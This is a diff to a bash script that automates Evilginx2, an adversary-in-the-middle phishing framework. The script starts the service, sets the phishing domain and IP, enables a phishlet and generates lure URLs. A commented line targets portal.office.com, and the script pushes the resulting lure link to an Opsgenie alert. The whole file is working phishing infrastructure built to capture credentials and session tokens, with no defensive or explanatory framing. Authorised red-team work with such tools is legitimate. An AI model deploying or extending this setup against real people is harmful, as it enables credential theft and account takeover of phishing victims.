@@ -1,26 +1,36 @@
 #!/bin/bash
+
 setup_evilginx() {
     domain_name=$1
     host_ip=$2
     redirect_url=$3
     default_phishlet=$4
+    # Start the Evilginx2 service in the background
+    /bin/evilginx -p /app/phishlets/ -developer -debug &
+    
+    # Wait for a specific log message that confirms the service is running
+    while ! pgrep -x "evilginx" > /dev/null; do
+    echo "Waiting for Evilginx2 service to start..."
+    sleep 2
+    done
+    
+    echo "Evilginx2 is running. Proceeding with configuration."
     
     echo "Setting up Evilginx for domain: $domain_name"
-
+    # Set up the hostname (domain or subdomain)
+    #sudo evilginx config domain "$subdomain"
+    config domain "$domain_name"
+    
     # Enable the phishlet
     #sudo evilginx phishlets enable $default_phishlet
     if ! phishlets enable "$default_phishlet"; then
     echo "Failed to enable phishlet" >&2
     exit 1
     fi    
-    # Set up the hostname (domain or subdomain)
-    #sudo evilginx config domain "$subdomain"
-    config domain "$domain_name"
-    
+
     # Bind to the IP address
     #sudo evilginx config ip "$host_ip"
     config ip "$host_ip"
-    
 }
 
 create_lure() {
@@ -180,15 +190,26 @@ default_phishlet=$(jq -r '.EvilGinx2.default_phishlet' "$config_file")
 default_redirect=$(jq -r '.EvilGinx2.default_redirect' "$config_file")
 opsgenie_api_key=$(jq -r '.Opsgenie_API_Key' "$config_file")
 
+# Check if any of the critical values are empty, "", or "none"
+if [[ -z "$domain_name" || "$domain_name" == "none" ]] || \
+   [[ -z "$host_ip" || "$host_ip" == "none" ]] || \
+   [[ -z "$default_phishlet" || "$default_phishlet" == "none" ]]; then
+    echo "Missing critical value." >&2
+    exit 1
+fi
 #Setup EvilGinx2
 mkdir -p /shared-data/EG2_DB /shared-data/fresh-data /shared-data/used-data
-/bin/evilginx -p /app/phishlets/ -developer -debug
 setup_evilginx $domain_name $host_ip $default_redirect $default_phishlet 
 
 # Automate multiple lure creation
 #create_lure $default_phishlet $domain_name "https://portal.office.com"
 lure_url=$(create_lure /app/phishlets/ $domain_name $default_redirect)
 
+if [[ -z "$opsgenie_api_key" || "$opsgenie_api_key" == "none" ]] || \
+   [[ -z "$lure_url" || "$lure_url" == "none" ]]; then
+    echo "Missing critical value." >&2
+    exit 1
+fi
 # Example usage of the function
 API_URL="https://api.opsgenie.com/v2/alerts" # This can be dynamically changed
 send_opsgenie_alert "$API_KEY" "$API_URL" "$lure_url"
